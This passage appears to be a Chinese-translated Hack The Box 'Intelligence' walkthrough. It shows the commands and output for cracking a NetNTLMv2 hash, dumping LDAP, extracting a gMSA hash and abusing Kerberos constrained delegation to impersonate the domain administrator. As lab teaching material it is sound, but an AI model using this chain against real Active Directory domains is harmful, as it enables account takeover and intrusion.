bi translated">哈希破解</h1><p id="2ed2" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">几分钟后，我们抓住了泰德。格雷夫斯密码散列。我们可以使用JohnTheRipper来尝试破解它:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="2439" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/intelligence]<br/>└─# nth --file hash.txt <br/><br/>Ted.Graves::intelligence:98592689b95ecf6e:435A2306687E740FF0DDFA17CAF82E4B&lt;SNIP&gt;9003E0048005400540050002F00770065006200700065006E006300650072002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000<br/><br/>Most Likely <br/>NetNTLMv2, HC: 5600 JtR: netntlmv2<br/><br/>┌──(root💀kali)-[~/htb/intelligence]<br/>└─# john hash.txt -format=netntlmv2 -w=/usr/share/wordlists/rockyou.txt</span><span id="da1c" class="nc km iq my b gy nj ne l nf ng">Using default input encoding: UTF-8<br/>Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])<br/>Will run 4 OpenMP threads<br/>Press 'q' or Ctrl-C to abort, almost any other key for status<br/>&lt;HIDDEN&gt;        (Ted.Graves)<br/>1g 0:00:00:05 DONE (2021-10-07 22:19) 0.1941g/s 2100Kp/s 2100Kc/s 2100KC/s Mrz.deltasigma..Morgant1<br/>Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably<br/>Session completed</span></pre><h1 id="c4d2" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">服务帐户</h1><p id="6ce9" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">只用了几秒钟就破解了。然而，我遇到了一点困难，因为这些凭证并没有在我认为它们会起作用的地方起作用。由于在SMB上没有前进的道路，我回到下载的pdf文件上，搜索Ted:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="d746" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/intelligence]<br/>└─# grep -rl "Ted" *.txt | cat $file<br/>2020-12-30-upload.txt<br/><br/>┌──(root💀kali)-[~/htb/intelligence]<br/>└─# cat 2020-12-30-upload.txt</span><span id="9913" class="nc km iq my b gy nj ne l nf ng">Internal IT Update<br/>There has recently been some outages on our web servers. Ted has gotten a<br/>script in place to help notify us if this happens again.<br/>Also, after discussion following our recent security audit we are in the process<br/>of locking down our service accounts.</span></pre><h1 id="ad6d" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">LDAP转储</h1><p id="ef2e" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">有趣的是，这个文件提到了安全审计，他们正在锁定服务帐户。稍微搜索一下，就从hacktricks中找到了<a class="ae ni" href="https://book.hacktricks.xyz/pentesting/pentesting-ldap" rel="noopener ugc nofollow" target="_blank">这个</a>。我有Ted的有效证书，所以查看了<a class="ae ni" href="https://github.com/dirkjanm/ldapdomaindump" rel="noopener ugc nofollow" target="_blank"> ldapsearch </a>，这是Dirk Janm的另一个工具:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="b1e8" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/intelligence]<br/>└─# ldapdomaindump 10.10.10.248 -u 'intelligence\Ted.Graves' -p '&lt;HIDDEN&gt;'</span><span id="d273" class="nc km iq my b gy nj ne l nf ng">[*] Connecting to host...<br/>[*] Binding to host<br/>[+] Bind OK<br/>[*] Starting domain dump<br/>[+] Domain dump finished<br/><br/>┌──(root💀kali)-[~/htb/intelligence]<br/>└─# ldd2pretty --directory .<br/><br/>    +--------------------------------------+<br/>    | Getting Domain Sid For               |<br/>    +--------------------------------------+<br/>    <br/>[+] Domain Name: intelligence<br/>Domain Sid: S-1-5-21-4210132550-3389855604-3437519686<br/><br/>    +-----------------------------------------+<br/>    | Password Policy Information             |<br/>    +-----------------------------------------+<br/>    <br/>[+] Password Info for Domain: INTELLIGENCE<br/>        [+] Minimum password length:  5<br/>        [+] Password history length: 0<br/>        [+] Password Complexity Flags: 000000<br/><br/>                [+] Domain Refuse Password Change: 0<br/>                [+] Domain Password Store Cleartext: 0<br/>                [+] Domain Password Lockout Admins: 0<br/>                [+] Domain Password No Clear Change: 0<br/>                [+] Domain Password No Anon Change: 0<br/>                [+] Domain Password Complex: 0<br/><br/>        [+] Maximum password age: 999999999 days, 23:59:59.999999<br/>        [+] Minimum password age: 0:00:00<br/>        [+] Reset Account Lockout Counter: 0:00:00<br/>        [+] Account Lockout Threshold: 0<br/>        [+] Forced Log off Time: Not Set<br/><br/>    +------------------------+<br/>    | Users Infos            |<br/>    +------------------------+<br/>    <br/>Account: INTELLIGENCE\Ted.Graves  Name: Ted Graves<br/>Account: INTELLIGENCE\Laura.Lee   Name: Laura Lee<br/>Account: INTELLIGENCE\Jason.Patterson   Name: Jason Patterson<br/>Account: INTELLIGENCE\Jeremy.Mora       Name: Jeremy Mora<br/>Account: INTELLIGENCE\James.Curbow      Name: James Curbow<br/>&lt;SNIP&gt;</span></pre><h1 id="334f" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">受约束的委托</h1><p id="6112" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">我已经从AD转储了我们可以访问的所有内容，因此输出会持续很长时间。这是我们感兴趣的部分:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="a330" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/intelligence]<br/>└─# grep "DELEGATION" *.grep<br/> <br/>domain_computers.grep:svc_int   svc_int$  svc_int.intelligence.htb    WORKSTATION_ACCOUNT, TRUSTED_TO_AUTH_FOR_DELEGATION</span><span id="d97d" class="nc km iq my b gy nj ne l nf ng">domain_computers.grep:DC        DC$       dc.intelligence.htb       SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION</span></pre><h1 id="0d2b" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">Pywerview</h1><p id="4e8b" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">更多搜索找到了<a class="ae ni" href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation" rel="noopener ugc nofollow" target="_blank">这篇</a>有用的文章。它提到了关于委托信任的计算机对象，所以我使用Python版本的PowerView从<a class="ae ni" href="https://github.com/the-useless-one/pywerview" rel="noopener ugc nofollow" target="_blank">这里</a>获取了更多详细信息:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="e256" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/intelligence]<br/>└─# git clone <a class="ae ni" href="https://github.com/the-useless-one/pywerview.git" rel="noopener ugc nofollow" target="_blank">https://github.com/the-useless-one/pywerview.git</a></span><span id="5b36" class="nc km iq my b gy nj ne l nf ng">Cloning into 'pywerview'...<br/>remote: Enumerating objects: 1731, done.<br/>remote: Counting objects: 100% (571/571), done.<br/>remote: Compressing objects: 100% (323/323), done.<br/>remote: Total 1731 (delta 425), reused 385 (delta 247), pack-reused 1160<br/>Receiving objects: 100% (1731/1731), 383.68 KiB | 1.76 MiB/s, done.<br/>Resolving deltas: 100% (1235/1235), done.<br/><br/>┌──(root💀kali)-[~/htb/intelligence/pywerview]<br/>└─# python3 ./pywerview.py get-netcomputer -u Ted.Graves -p &lt;HIDDEN&gt; -w intelligence.htb --computername svc_int.intelligence.htb -t 10.10.10.248 --full-data</span></pre><p id="0e34" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">从冗长的输出来看，这是关键部分:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="2f78" class="nc km iq my b gy nd ne l nf ng">accountexpires:                 never<br/>distinguishedname:              CN=svc_int,CN=Managed Service Accounts,DC=intelligence,DC=htb<br/>dnshostname:                    svc_int.intelligence.htb<br/>msds-allowedtodelegateto:       WWW/dc.intelligence.htb<br/>name:                           svc_int<br/>objectcategory:                 CN=ms-DS-Group-Managed-Service-Account,CN=Schema,CN=Configuration,DC=intelligence,DC=htb<br/>objectclass:                    msDS-GroupManagedServiceAccount<br/>samaccountname:                 svc_int$<br/>useraccountcontrol:             ['WORKSTATION_TRUST_ACCOUNT', 'TRUSTED_TO_AUTH_FOR_DELEGATION']</span></pre><h1 id="ce82" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">gMSADumper</h1><p id="6f50" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">我们有一个受信任的组管理服务帐户，可委托给WWW。有了Ted的访问权限，我们就可以使用<a class="ae ni" href="https://github.com/micahvandeusen/gMSADumper" rel="noopener ugc nofollow" target="_blank">GMS dumper</a>获取那个账户的散列值:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="658b" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/intelligence]<br/>└─# wget <a class="ae ni" href="https://raw.githubusercontent.com/micahvandeusen/gMSADumper/main/gMSADumper.py" rel="noopener ugc nofollow" target="_blank">https://raw.githubusercontent.com/micahvandeusen/gMSADumper/main/gMSADumper.py</a></span><span id="b0a1" class="nc km iq my b gy nj ne l nf ng">--2021-10-08 15:12:07--  https://raw.githubusercontent.com/micahvandeusen/gMSADumper/main/gMSADumper.py<br/>Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.110.133, 185.199.109.133, ...<br/>Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.<br/>HTTP request sent, awaiting response... 200 OK<br/>Length: 4609 (4.5K) [text/plain]<br/>Saving to: ‘gMSADumper.py’<br/>gMSADumper.py      100%[==================================================================&gt;]   4.50K  --.-KB/s    in 0.001s  <br/>2021-10-08 15:12:07 (3.61 MB/s) - ‘gMSADumper.py’ saved [4609/4609]<br/><br/>┌──(root💀kali)-[~/htb/intelligence]<br/>└─# python3 gMSADumper.py -u Ted.Graves -p &lt;HIDDEN&gt; -d intelligence.htb</span><span id="a2f4" class="nc km iq my b gy nj ne l nf ng">Users or groups who can read password for svc_int$:<br/> &gt; DC$<br/> &gt; itsupport<br/>svc_int$:::d170ae&lt;HIDDEN&gt;e12dd621</span></pre><h1 id="1073" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">打包服务票</h1><p id="ab3a" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">利用服务帐户的散列，我们可以使用<a class="ae ni" href="https://github.com/SecureAuthCorp/impacket" rel="noopener ugc nofollow" target="_blank"> Impacket </a> getST.py脚本来请求服务票证，同时模拟管理员:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="5209" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/intelligence]<br/>└─# python3 /usr/share/doc/python3-impacket/examples/getST.py intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb -hashes :d170ae&lt;HIDDEN&gt;e12dd621 -impersonate administrator</span><span id="f0df" class="nc km iq my b gy nj ne l nf ng">Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation<br/>[*] Getting TGT for user<br/>Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)</span></pre><h1 id="8887" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">时间偏差修正</h1><p id="f6f3" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">我的虚拟机的时钟必须在域控制器的几分钟之内，所以首先我们需要同步它们。这太痛苦了！</p><p id="8ab7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">关闭虚拟机，然后从主机，对我来说是Windows 10你需要禁用时间同步。打开PowerShell并键入以下内容:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="2139" class="nc km iq my b gy nd ne l nf ng">PS C:\Program Files\Oracle\VirtualBox&gt; .\VBoxManage.exe setextradata "Kali-Linux-2021.3-vbox-amd64" "VBoxInternal/Devices/VMMDev/0/Config/GetHostTimeDisabled" 1</span></pre><p id="eea3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在启动虚拟机备份并安装ntupdate和chrony:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="d468" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~]<br/>└─# apt install ntpdate chrony</span><span id="9e87" class="nc km iq my b gy nj ne l nf ng">Reading package lists... Done<br/>Building dependency tree... Done<br/>Reading state information... Done<br/>chrony is already the newest version (4.1-3).<br/>ntpdate is already the newest version (1:4.2.8p15+dfsg-1).<br/>0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.</span></pre><p id="2fec" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在将Kali设置为使用NTP作为其时间服务器，并从包装盒中进行更新:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="4831" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~]<br/>└─# timedatectl set-ntp true<br/><br/>┌──(root💀kali)-[~]<br/>└─# ntpdate 10.10.10.248</span><span id="44d6" class="nc km iq my b gy nj ne l nf ng"> 8 Oct 22:52:49 ntpdate[1268]: step time server 10.10.10.248 offset +26079.737476 sec</span></pre><p id="9f23" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们看到我们的时钟被改变了。现在我们再次尝试getST:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="f8e6" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~]<br/>└─# python3 /usr/share/doc/python3-impacket/examples/getST.py intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb -hashes :d170ae19de30439df55d6430e12dd621 -impersonate administrator</span><span id="8eb3" class="nc km iq my b gy nj ne l nf ng">Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation<br/><br/>[*] Getting TGT for user<br/>[*] Impersonating administrator<br/>[*]     Requesting S4U2self<br/>[*]     Requesting S4U2Proxy<br/>[*] Saving ticket in administrator.ccache<br/><br/>┌──(root💀kali)-[~]<br/>└─# export KRB5CCNAME=Administrator.ccache</span></pre><h1 id="962f" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">根标志</h1><p id="071d" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">这次成功了。我们最终可以使用Impacket smbclient脚本以管理员身份进行连接:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="1954" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~]<br/>└─# impacket-smbclient Administrator@dc.intelligence.htb -k -no-pass</span><span id="8a48" class="nc km iq my b gy nj ne l nf ng">Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation<br/>[-] [Errno Connection error (dc.intelligence.htb:445)] [Errno -2] Name or service not known</span></pre><p id="9ae1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">另一个问题！这次很简单，我忘记了将DC添加到我的hosts文件中:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="922c" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/intelligence]<br/>└─# echo "10.10.10.248 dc.intelligence.htb" &gt;&gt; /etc/hosts</span></pre><p id="6202" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">再试最后一次:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="b601" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~]<br/>└─# impacket-smbclient Administrator@dc.intelligence.htb -k -no-pass</span><span id="8edb" class="nc km iq my b gy nj ne l nf ng">Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation<br/>Type help for list of commands<br/># shares<br/>ADMIN$<br/>C$<br/>IPC$<br/>IT<br/>NETLOGON<br/>SYSVOL<br/>Users<br/># cd Users<br/># cd Administrator<br/># cd Desktop<br/># ls<br/>drw-rw-rw-          0  Mon Apr 19 01:51:57 2021 .<br/>drw-rw-rw-          0  Mon Apr 19 01:51:57 2021 ..<br/>-rw-rw-rw-        282  Mon Apr 19 01:40:10 2021 desktop.ini<br/>-rw-rw-rw-         34  Fri Oct  8 12:56:30 2021 root.txt<br/># get root.txt<br/># exit<br/><br/>┌──(root💀kali)-[~]<br/>└─# cat root.txt                                     <br/>&lt;HIDDEN&gt;</span></pre><p id="e85e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们终于找到了箱子。这对我来说很难，我需要做更多的窗口框！</p><p id="1487" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">下次见。</p></div><div class="ab cl nk nl hu nm" role="separator"><span class="nn bw bk no np nq"/><span class="nn bw bk no np nq"/><span class="nn bw bk no np"/></div><div class="ij ik il im in"><p id="4988" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你喜欢这篇文章，请给我一个掌声。</p><p id="e3bb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">推特—<a class="ae ni" href="https://twitter.com/pencer_io" rel="noopener ugc nofollow" target="_blank">https://twitter.com/pencer_io</a><br/>网站— <a class="ae ni" href="https://pencer.io/" rel="noopener ugc nofollow" target="_blank"> https://pencer.io </a></p><p id="e8a6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="nr">原载于2021年11月24日</em><a class="ae ni" href="https://pencer.io/ctf/ctf-htb-intelligence" rel="noopener ugc nofollow" target="_blank"><em class="nr">https://pencer . io</em></a><em class="nr">。</em></p></div></div>    
</body>
</html>